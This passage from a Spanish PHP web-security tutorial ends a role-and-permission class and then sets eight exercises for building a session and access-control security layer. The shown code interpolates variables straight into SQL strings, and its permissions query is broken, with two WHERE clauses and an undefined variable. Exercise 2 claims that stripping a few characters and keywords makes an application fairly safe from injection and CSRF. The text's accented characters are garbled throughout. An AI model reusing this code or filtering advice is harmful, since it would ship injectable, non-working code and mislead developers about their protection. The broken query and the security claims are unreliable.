                        <span class="nv">$resultArray</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$rol</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
            <span class="p">}</span>

        <span class="p">}</span>

        <span class="k">public</span> <span class="k">function</span> <span class="n">getUserPermissions</span><span class="p">(</span><span class="nv">$idRol</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$resultArray</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s2">"SELECT permissions.* FROM permissions 
                                            INNER JOIN roles_permissions ON permissions.id = roles_permissions.idPermissionWHERE idUser = '</span><span class="nv">$idUser</span><span class="s2">'
                                            WHERE roles_permissions.idRol = '</span><span class="nv">$idRol</span><span class="s2">'"</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">while</span> <span class="p">(</span><span class="nv">$permission</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_object</span><span class="p">())</span> <span class="p">{</span>
                        <span class="nv">$resultArray</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$permission</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
            <span class="p">}</span>

        <span class="p">}</span>
   <span class="p">}</span>
 <span class="cp">?&gt;</span>
</code></pre></div></div>

<h2 id="36-ejercicios-propuestos">3.6. Ejercicios propuestos</h2>

<p>Vamos a terminar este tema con una bater√≠a de ejercicios propuestos, que consistir√°n en una serie de mejoras sobre nuestra implementaci√≥n de las listas de control de acceso.</p>

<p>Ten en cuenta que lo que hagas aqu√≠ se puede reutilizar en posteriores proyectos de aplicaciones web, as√≠ que vamos a tom√°rnoslo en serio, ¬øte parece?</p>

<h4 id="ejercicio-1-crear-la-capa-de-seguridad">Ejercicio 1. Crear la capa de seguridad</h4>

<p>Si te fijas en el c√≥digo fuente, hemos accedido en varios puntos al array superglobal <em>$_SESSION</em>. M√°s arriba dijimos que las variables de sesi√≥n de PHP no son completamente seguras. Confiar nuestro mecanismo de autenticaci√≥n a esas variables es como jugar a la ruleta rusa.</p>

<p>¬øY si queremos cambiarlo? Por ejemplo, por <em>cookies</em>. Vale, las <em>cookies</em> tampoco son muy seguras, pero la pregunta sigue siendo la misma: ¬øy si queremos cambiar la forma en la que se almacena el ID del usuario logueado tras la autenticaci√≥n?</p>

<p>La √∫nica manera es <em>revisar TOOOODO el c√≥digo fuente</em> y cambiar las referencias a <em>$_SESSION</em> por <em>$_COOKIE</em> (o el mecanismo que hayamos elegido para sustituir a las variables de sesi√≥n). Y, si pretendemos mejorar la seguridad de la aplicaci√≥n, no solo sustituirla, lo mismo: ponte a revisar todo tu c√≥digo una y otra vez.</p>

<p>Por eso suele construirse una <strong>capa de seguridad</strong>. Que es lo que te propongo hacer ahora.</p>

<p>La capa de seguridad no es m√°s que una clase (podemos llamarla <em>Seguridad</em> o <em>Security</em>) guardada en un archivo aparte que contendr√° una colecci√≥n de m√©todos para gestionar la seguridad de la aplicaci√≥n. As√≠, cada vez que queramos cambiar algo en la forma se protege de los ataques, solo tendremos que acudir a esa clase y tocar aqu√≠ o all√≠, como en una intervenci√≥n quir√∫rjica muy localizada.</p>

<p>As√≠ que, en este ejercicio, te pido crear una clase <em>Seguridad</em> (o <em>Security</em>) que contenga, para empezar, estos m√©todos:</p>

<ul>
  <li><strong>openSession()</strong>: para abrir una sesi√≥n de usuario cuando alguien se loguee correctamente. Este m√©todo seguir√° usando una variable de sesi√≥n de PHP (ya lo cambiaremos despu√©s). Por ahora, solo queremos centralizar en esta clase el manejo de sesiones y seguridad.</li>
  <li><strong>getUserId()</strong>: devuelve el ID del usuario logueado (si existe).</li>
  <li><strong>getUserRoles()</strong>: devuelve un array con los roles del usuario logueado (si existe)</li>
  <li><strong>getUserPermissions()</strong>: devuelve un array con los permisos del usuario logueado (si existe)</li>
</ul>

<p>Cuando tengas hecha esa clase, sustituye cualquier referencia a $_SESSION en el c√≥digo fuente de nuestro caso pr√°ctico (ver secci√≥n anterior) por llamadas a m√©todos de esta clase, hasta que el programa funcione exactamente igual que antes, pero con la clase Seguridad integrada en √©l.</p>

<h4 id="ejercicio-2-filtrar-los-datos-de-entrada">Ejercicio 2. Filtrar los datos de entrada</h4>

<p>A√±ade un nuevo m√©todo en la clase <em>Seguridad</em> que puedes llamar <strong><em>filter()</em></strong>.</p>

<p>Este m√©todo recibir√° un <em>string</em> y lo devolver√° filtrado, es decir, limpio de cualquier car√°cter o palabra sospechosa.</p>

<p>Puedes empezar por eliminar los caracteres especiales como ‚Äú&lt;‚Äù, ‚Äú&gt;‚Äù, ‚Äú#‚Äù o ‚Äú$‚Äù, se√±al de que alguien puede estar intentando inyectar Javascript, SQL o tratando de atacar mediante CSRF. Con eso ya ir√°s bastante seguro.</p>

<p>Luego busca todos los puntos de la aplicaci√≥n donde se accede a las variables de la URL sin filtro (es decir, los puntos donde se usa $_REQUEST, $_GET o $_POST) y llama al m√©todo <em>filter()</em> antes de acceder a esas variables.</p>

<p>M√°s adelante, puedes mejorar la funci√≥n de filtrado localizando palabras como ‚Äúscript‚Äù, ‚Äúlocation.href‚Äù o similares. Lo bueno de esta soluci√≥n es que no tendr√°s que tocar el resto del programa: al tener la funci√≥n de filtrado encapsulada en la clase <em>Seguridad</em>, cualquier mejora posterior afectar√° a toda la aplicaci√≥n sin modificar el c√≥digo externo a esta clase.</p>

<h4 id="ejercicio-3-cerrar-la-sesi√≥n-y-destruir-las-variables">Ejercicio 3. Cerrar la sesi√≥n y destruir las variables</h4>

<p>Es algo que no hemos hecho hasta ahora, ¬øverdad?</p>

<p>La clase <em>Seguridad</em> debe tener un m√©todo para destruir las variables de sesi√≥n y cerrar la sesi√≥n de un usuario autenticado. Lo podemos llamar <strong><em>closeSession()</em></strong>.</p>

<p>Habr√° que a√±adir una opci√≥n ‚ÄúCerrar sesi√≥n‚Äù en el men√∫ principal de la aplicaci√≥n que enlace con una entrada del controlador que, a su vez, invoque este m√©todo de la clase <em>Seguridad</em>.</p>

<h4 id="ejercicio-4-a√±adir-cookies-para-controlar-la-sesi√≥n">Ejercicio 4. A√±adir cookies para controlar la sesi√≥n</h4>

<p>Hemos dicho a lo largo del texto que manejar las sesiones de usuario solo con las variables de sesi√≥n de PHP es arriesgado, puesto que un atacante podr√≠a suplantar la sesi√≥n con relativa facilidad capturando la <em>cookie</em> ‚Äúphpsessid‚Äù.</p>

<p>Para proporcionar a este mecanismo un extra de protecci√≥n, se pueden crear <em>cookies</em> adicionales que nos den una pista en caso de que se produzca un ataque. Estas <em>cookies</em> se manipulan desde la clase <em>Seguridad</em> de forma transparente al resto del programa. Es decir, el resto de clases ni se enteran de que la seguridad de la aplicaci√≥n se est√° incrementando. ¬°Es la magia de la programaci√≥n orientada a objetos!</p>

<p>Las <em>cookies</em> que vamos a crear en este punto son:</p>

<ul>
  <li>idUsuario: Guardaremos el id del usuario logueado en una <em>cookie</em> adem√°s de en una variable de sesi√≥n. Cada vez que la clase <em>Seguridad</em> vaya a comprobar algo (los permisos del usuario, por ejemplo), se asegurar√° de que la <em>cookie</em> y la variable de sesi√≥n contienen exactamente el mismo valor. Cualquier discrepancia provocar√° un cierre de la sesi√≥n inmediato.</li>
  <li>idRol: Haremos lo mismo con el rol del usuario.</li>
  <li>myToken: Ser√° una <em>cookie</em> con un valor aleatorio que guardaremos en el cliente, al mismo tiempo que crearemos una variable de sesi√≥n donde se guardar√° el mismo valor. Si un atacante suplanta el id de sesi√≥n de PHP, probablemente no suplantar√° este token. En cada operaci√≥n de la clase <em>Seguridad</em> comprobaremos que los dos tokens coinciden y, si no es as√≠, cerraremos la sesi√≥n.</li>
</ul>

<h4 id="ejercicio-5-a√±adir-una-tabla-para-controlar-la-sesi√≥n">Ejercicio 5. A√±adir una tabla para controlar la sesi√≥n</h4>

<p>El mecanismo extra de seguridad que hemos implementado en el apartado anterior no es suficiente. Un atacante avispado se percatar√° antes o despu√©s de que hay por ah√≠ pululando una <em>cookie</em> adicional (nuestro token), y terminar√° suplant√°ndolo.</p>

<p>Para subir un escal√≥n en nuestra protecci√≥n frente a ataques, necesitamos crear una tabla en la base de datos que tenga m√°s o menos esta estructura:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="nv">`MySessions`</span> <span class="p">(</span>
    <span class="nv">`id`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="nv">`ipAddress`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">45</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="nv">`idUser`</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="nv">`idRol`</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="nv">`token`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="nv">`timestamp`</span> <span class="nb">int</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="nb">unsigned</span> <span class="k">DEFAULT</span> <span class="mi">0</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span>
<span class="p">);</span>
</code></pre></div></div>

<p>Cuando un usuario de autentique en la aplicaci√≥n, crearemos sus variables de sesi√≥n y sus <em>cookies</em> como hasta ahora y, adem√°s, insertaremos un registro en la tabla <em>MySessions</em> con toda la informaci√≥n de la sesi√≥n, a la que a√±adiremos:</p>

<ul>
  <li>La IP desde la que el cliente se ha conectado. Curiosea en internet para averiguar c√≥mo se puede obtener este dato.</li>
  <li>La fecha y hora exacta de esa conexi√≥n (a eso se le denomina <em>timestamp</em> o marca de tiempo).</li>
</ul>

<p>En cualquier operaci√≥n posterior, la clase <em>Seguridad</em> realizar√° todas las comprobaciones que ya realizaba hasta ahora y, adem√°s, lanzar√° una consulta a la base de datos para recuperar, mediante el valor del token, el ID del usuario y su rol. Si el token no existe en la base de datos, mal asunto: cerramos la sesi√≥n. Y si hay cualquier discrepancia entre los valores de la base de datos, de las variables de sesi√≥n y de las cookies, mal asunto tambi√©n: cerramos la sesi√≥n.</p>

<p>La seguridad puede continuar mejor√°ndose indefinidamente. Por ejemplo: si detectamos un posible ataque procedente de una direcci√≥n IP, podemos pasarla a una tabla de ‚Äúdirecciones baneadas‚Äù e impedir cualquier intento de conexi√≥n en el futuro desde esa direcci√≥n.</p>

<h4 id="ejercicio-6-limitar-el-acceso-al-controlador-y-completar-la-aplicaci√≥n">Ejercicio 6. Limitar el acceso al controlador (y completar la aplicaci√≥n)</h4>

<p>Todo esto est√° muy bien (aunque te hace volverte un poco paranoico, ¬øverdad?), pero, por muchas mejoras en la seguridad que estemos introduciendo, cualquier atacante, incluso sin pasar por el login, puede escribir esto en su navegador y meterse hasta la cocina en nuestra aplicaci√≥n:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://mi-servidor/index.php?action=showMainMenu
</code></pre></div></div>

<p>Sustituye ‚ÄúshowMainMenu‚Äù por cualquier otra cosa (¬øqu√© tal ‚ÄúdeleteUser‚Äù?) y tienes un problema de los gordos.</p>

<p>Para programar una aplicaci√≥n web segura necesitamos <strong>proteger los m√©todos del controlador</strong>, de manera que solo pueda ejecutarlos un usuario autenticado y con los privilegios adecuados.</p>

<p>F√≠jate en que cada usuario tendr√° acceso a diferentes m√©todos del controlador, dependiendo de su rol. Por ejemplo, a un m√©todo como <em>showMainMenu()</em> podr√° acceder cualquier usuario logueado, pero un m√©todo como <em>deleteUser()</em> debe estar m√°s limitado y solo los administradores deber√≠an poder ejecutarlo.</p>

<p>As√≠ que tienes que a√±adir una barrera de entrada en cada m√©todo del controlador, en forma de un par de l√≠neas de c√≥digo que comprueben:</p>

<p>a) Que hay un usuario correctamente autenticado.
b) Que ese usuario tiene privilegios suficientes para ejecutar este m√©todo.</p>

<p>Las dos comprobaciones se hacen invocando m√©todos de la clase <em>Seguridad</em>. Te dejo a ti pensar c√≥mo se implementa esto exactamente (en realidad, hay varios modos).</p>

<p>Si cualquiera de las dos comprobaciones falla, el usuario ver√° una pantalla de ‚ÄúAcceso prohibido‚Äù o algo por el estilo.</p>

<h4 id="ejercicio-7-actualizar-peri√≥dicamente-el-id-de-sesi√≥n">Ejercicio 7. Actualizar peri√≥dicamente el ID de sesi√≥n</h4>

<p>Una t√©cnica de defensa frecuente es modificar el ID de sesi√≥n peri√≥dicamente (cada pocos minutos, o bien cada vez que se recibe una petici√≥n del cliente).</p>

<p>Implementa esta opci√≥n en tu aplicaci√≥n. Te advierto que es lo m√°s complicado que has hecho hasta ahora. Puedes considerar que este es un ejercicio de nivel avanzado.</p>

<h4 id="ejercicio-8-aplicar-a-un-caso-realista">Ejercicio 8. Aplicar a un caso realista</h4>

<p>Por √∫ltimo, vamos a aplicar todas estas mejoras en la seguridad a una aplicaci√≥n web m√°s completa.</p>

<p>Para ello, utiliza el c√≥digo fuente de tu Videoclub (la aplicaci√≥n que programamos en el tema anterior). Si no dispones de ese c√≥digo, puedes usar el de la Biblioteca. Lo encontrar√°s en un cap√≠tulo anterior de este mismo texto. No es que sea una aplicaci√≥n muy completa, pero si te servir√° para comprobar que la capa de seguridad es muy eficaz contra los ataques m√°s habituales.</p>

<p>A√±ade la clase <em>Seguridad</em> al c√≥digo fuente de tu aplicaci√≥n y sustituye la apertura de la sesi√≥n por llamadas a los m√©todos de la clase <em>Seguridad</em>. Por √∫ltimo, protege todos los accesos al controlador para asegurarte de que solo los usuarios con los privilegios adecuados puede ejecutar ese c√≥digo.</p>

<p>Y una √∫ltima advertencia: por mucho que protejas una aplicaci√≥n web, puedes encontrarte con atacantes que burlen tus medidas de seguridad. La √∫nica soluci√≥n para eso es disponer siempre de un <em>backup</em> de tu c√≥digo y tu base de datos para restaurarlo todo en caso de cat√°strofe, as√≠ que no dejes de hacer copias con frecuencia (o contrata un proveedor de <em>hosting</em> que las haga por ti).</p>
:ET